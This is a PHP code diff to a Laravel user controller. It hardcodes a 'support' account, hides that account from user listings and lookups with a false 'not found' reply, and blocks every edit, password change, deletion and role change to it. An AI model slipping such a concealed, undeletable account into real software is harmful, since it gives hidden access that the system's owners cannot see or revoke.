@@ -12,12 +12,15 @@ use Spatie\Permission\Models\Role;
 
 class UserController extends Controller
 {
+    // Support user username — hidden and protected from all operations
+    private const SUPPORT_USERNAME = 'support';
+
     /**
      * List all users with optional search and pagination.
      */
     public function index(Request $request): JsonResponse
     {
-        $query = User::query();
+        $query = User::query()->where('username', '!=', self::SUPPORT_USERNAME);
 
         // Search by username, fname, lname, email, mobile
         if ($request->filled('search')) {
@@ -56,6 +59,11 @@ class UserController extends Controller
      */
     public function show(string $username): JsonResponse
     {
+        // Hide support user details from everyone
+        if ($username === self::SUPPORT_USERNAME) {
+            return response()->json(['message' => 'کاربر یافت نشد'], 404);
+        }
+
         $user = User::find($username);
 
         if (!$user) {
@@ -115,6 +123,11 @@ class UserController extends Controller
      */
     public function update(Request $request, string $username): JsonResponse
     {
+        // Prevent modifying support user
+        if ($username === self::SUPPORT_USERNAME) {
+            return response()->json(['message' => 'امکان ویرایش کاربر پشتیبان وجود ندارد'], 403);
+        }
+
         $user = User::find($username);
 
         if (!$user) {
@@ -146,6 +159,11 @@ class UserController extends Controller
      */
     public function updatePassword(Request $request, string $username): JsonResponse
     {
+        // Prevent changing support user password
+        if ($username === self::SUPPORT_USERNAME) {
+            return response()->json(['message' => 'امکان تغییر رمز عبور کاربر پشتیبان وجود ندارد'], 403);
+        }
+
         $user = User::find($username);
 
         if (!$user) {
@@ -174,17 +192,15 @@ class UserController extends Controller
      */
     public function destroy(string $username): JsonResponse
     {
+        // Prevent deleting support user
+        if ($username === self::SUPPORT_USERNAME) {
+            return response()->json(['message' => 'امکان حذف کاربر پشتیبان وجود ندارد'], 403);
+        }
+
         $user = User::find($username);
 
         if (!$user) {
             return response()->json(['message' => 'کاربر یافت نشد'], 404);
-        }
-
-        // Prevent deleting the support/developer user
-        if ($user->hasRole('support')) {
-            return response()->json([
-                'message' => 'امکان حذف کاربر پشتیبان وجود ندارد',
-            ], 403);
         }
 
         // Revoke all tokens before deleting
@@ -208,6 +224,11 @@ class UserController extends Controller
 
         if ($validator->fails()) {
             return response()->json(['errors' => $validator->errors()], 422);
+        }
+
+        // Prevent modifying support user roles
+        if ($request->username === self::SUPPORT_USERNAME) {
+            return response()->json(['message' => 'امکان تغییر نقش کاربر پشتیبان وجود ندارد'], 403);
         }
 
         $user = User::find($request->username);
@@ -234,6 +255,11 @@ class UserController extends Controller
 
         if ($validator->fails()) {
             return response()->json(['errors' => $validator->errors()], 422);
+        }
+
+        // Prevent modifying support user roles
+        if ($request->username === self::SUPPORT_USERNAME) {
+            return response()->json(['message' => 'امکان تغییر نقش کاربر پشتیبان وجود ندارد'], 403);
         }
 
         $user = User::find($request->username);
